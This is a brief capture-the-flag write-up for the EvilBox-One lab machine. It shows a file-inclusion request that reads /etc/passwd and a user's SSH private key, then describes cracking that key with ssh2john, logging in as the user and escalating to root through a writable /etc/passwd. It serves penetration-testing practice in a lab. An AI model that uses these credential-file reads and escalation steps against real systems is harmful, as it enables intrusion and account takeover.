###### tags: `Offsec` `PG Play` `Easy` `Linux` # EvilBox-One
```
┌──(kali㉿kali)-[~/pgplay]
...
``` Go to`http://192.168.220.212/secret/evil.php?command=/etc/passwd`can ![EvilBox-One_1.png](picture/EvilBox-One_1.png) TryGo to`/home/mowree/.ssh/id_rsa` `mowree`'s key
`http://192.168.220.212/secret/evil.php?command=/home/mowree/.ssh/id_rsa` ![EvilBox-One_2.png](picture/EvilBox-One_2.png) ```
...
-----END RSA PRIVATE KEY-----
``` use`ssh2john`crackcanget password`unicorn`
```
┌──(kali㉿kali)-[~/pgplay]
...
unicorn          (id_rsa)
``` login`mowree`afterin `/home/mowree`can get local.txt
```
┌──(kali㉿kali)-[~/pgplay]
└─$ chmod 600 id_rsa 
...
``` root `/etc/passwd`, `toor` can get proof.txt in /root
```
